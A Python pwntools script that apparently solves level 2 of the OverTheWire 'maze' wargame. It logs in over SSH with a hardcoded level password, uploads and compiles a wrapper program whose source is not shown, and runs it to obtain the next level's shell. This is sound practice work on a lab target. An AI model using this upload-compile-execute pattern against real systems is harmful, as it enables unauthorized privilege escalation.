#!/usr/bin/python3
from pwn import *
import os
import time

#Level information for ssh
level = 2
USER = 'maze%s' % level
HOST = 'maze.labs.overthewire.org'
PASS = 'fooghihahr'
PORT = 2225

#context.log_level = 'debug'

def connect_to_level():
    sh = ssh(user=USER, host=HOST, password=PASS, port=PORT)
    return sh

def setup_payload(sh):
    shell = sh.run('/bin/bash')
    w = log.progress("Creating /tmp/tald2")
    sh.set_working_directory(b'/tmp/tald2')
    shell.sendline("mkdir /tmp/tald2")
    shell.sendline("cd /tmp/tald2")
    w.success("Created")
    time.sleep(0.05)
    sh.upload_file("./m2wrapper.c")
    w = log.progress("Compiling maze 2 wrapper...")
    shell.sendline("gcc -m32 /tmp/tald2/m2wrapper.c -o /tmp/tald2/m2wrapper")
    w.success("compiled")

def execute_payload(sh):
    time.sleep(0.05)
    w = log.progress("Executing maze 2 wrapper...")
    shell = sh.run('/tmp/tald2/m2wrapper')
    w.success("maze3 shell established")
    shell.interactive()

sh = connect_to_level()
setup_payload(sh)
execute_payload(sh)
